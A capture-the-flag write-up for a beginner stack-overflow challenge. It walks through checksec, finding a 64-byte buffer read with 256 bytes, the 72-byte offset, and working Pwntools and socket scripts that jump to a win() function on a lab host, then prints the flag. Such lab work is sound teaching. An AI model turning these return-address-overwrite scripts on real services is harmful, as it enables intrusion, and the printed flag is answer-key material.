
<img width="420" height="592" alt="Screenshot 2026-07-12 080454" src="https://github.com/user-attachments/assets/8f6fad1d-6e3d-4522-9d13-f9a0d676df07" />
<h1>Warmup</h1>

<h2>Steps</h2>

<h3>Step 1 Identify the Challenge</h3>

<p>The challenge provides a 64-bit Linux binary named:</p>

<pre>warmup</pre>

<p>The goal is to exploit a stack buffer overflow and redirect the program to the hidden <strong>win</strong> function.</p>

<p>The remote service is:</p>

<pre>10.5.14.225:30019</pre>

<h3>Step 2 Inspect the Binary</h3>

<p>Check the binary information and security protections:</p>

<pre>file warmup
checksec --file=warmup
strings warmup | head
nm warmup | grep -E ' win|vuln|main'</pre>

<p><strong>Not stripped</strong> means function names such as <strong>win</strong> and <strong>vuln</strong> can be found easily.</p>

<p><strong>No PIE</strong> means the function addresses remain fixed.</p>

<p><strong>No stack canary</strong> means the return address can be overwritten without needing to recover a canary value.</p>

<p>The important functions are:</p>

<pre>win  = 0x40127b
vuln = 0x40131f
main = calls vuln()</pre>

<p>The program never normally calls <strong>win</strong>, so the buffer overflow must redirect execution to it.</p>

<h3>Step 3 Analyse the Vulnerable Function</h3>

<p>Open the binary in Ghidra, IDA, or disassemble it using:</p>

<pre>objdump -d -M intel warmup</pre>

<p>The vulnerable function contains logic similar to:</p>

<pre>void vuln(void) {
    char buf[0x40];

    puts("Tell me your name...");
    read(0, buf, 0x100);
    printf("Welcome aboard, %s", buf);
}</pre>

<p>The buffer can only store:</p>

<pre>0x40 bytes = 64 bytes</pre>

<p>However, the program reads:</p>

<pre>0x100 bytes = 256 bytes</pre>

<p>This allows the input to overflow beyond the buffer and overwrite the saved return address.</p>

<h3>Step 4 Examine the Win Function</h3>

<p>The hidden <strong>win</strong> function opens and prints the contents of <strong>flag.txt</strong>.</p>

<pre>void win(void) {
    int fd = open("flag.txt", O_RDONLY);

    // Read the flag
    // Print the flag

    _exit(0);
}</pre>

<p>If execution is redirected to this function, the program prints the flag.</p>

<h3>Step 5 Calculate the Offset</h3>

<p>The stack layout is:</p>

<pre>64-byte buffer
8-byte saved RBP
8-byte return address</pre>

<p>The offset from the beginning of the buffer to the return address is:</p>

<pre>64 + 8 = 72 bytes</pre>

<p>The required payload structure is:</p>

<pre>[72 bytes of padding][address of win]</pre>

<h3>Step 6 Pack the Win Address</h3>

<p>The address of the <strong>win</strong> function is:</p>

<pre>0x40127b</pre>

<p>The x86-64 architecture uses little-endian byte order. The packed address is:</p>

<pre>7b 12 40 00 00 00 00 00</pre>

<p>Create the payload using Python:</p>

<pre>import struct

payload = b"A" * 72
payload += struct.pack("&lt;Q", 0x40127b)</pre>

<p>Using Pwntools:</p>

<pre>from pwn import *

payload = b"A" * 72
payload += p64(0x40127b)</pre>

<h3>Step 7 Create the Remote Exploit</h3>

<p>Use the following Pwntools script:</p>

<pre>from pwn import *

HOST = "10.5.14.225"
PORT = 30019

WIN = 0x40127b
OFFSET = 72

io = remote(HOST, PORT)

io.recvuntil(b"recruit:")

payload = b"A" * OFFSET
payload += p64(WIN)

io.sendline(payload)

print(io.recvall(timeout=2).decode(errors="ignore"))</pre>

<h3>Step 8 — Run the Exploit</h3>

<p>Save the script as:</p>

<pre>exploit_warmup.py</pre>

<p>Run it using:</p>

<pre>python3 exploit_warmup.py</pre>

<p>The script performs the following actions:</p>

<pre>1. Connects to the challenge server
2. Waits for the input prompt
3. Sends 72 padding bytes
4. Overwrites the return address with 0x40127b
5. Redirects execution to win()
6. Prints the contents of flag.txt</pre>

<h3>Step 9 Alternative Without Pwntools</h3>

<p>The exploit can also be completed using the standard Python socket library:</p>

<pre>import socket
import struct

HOST = "10.5.14.225"
PORT = 30019

sock = socket.create_connection((HOST, PORT))

banner = sock.recv(4096)
print(banner.decode(errors="ignore"))

payload = b"A" * 72
payload += struct.pack("&lt;Q", 0x40127b)
payload += b"\n"

sock.sendall(payload)

result = sock.recv(4096)
print(result.decode(errors="ignore"))</pre>

<h3>Step 10 Understand the Exploit Flow</h3>

<p>When the payload is sent:</p>

<pre>1. The first 64 bytes fill the buffer
2. The next 8 bytes overwrite the saved RBP
3. The win address overwrites the saved return address
4. vuln() executes leave and ret
5. ret loads 0x40127b into RIP
6. Execution jumps to win()
7. win() reads and prints flag.txt</pre>

<h2>Final Flag</h2>

<pre>OPUCC{y0ur_1st_pwn_ch4ll3ng3!!!!}</pre>
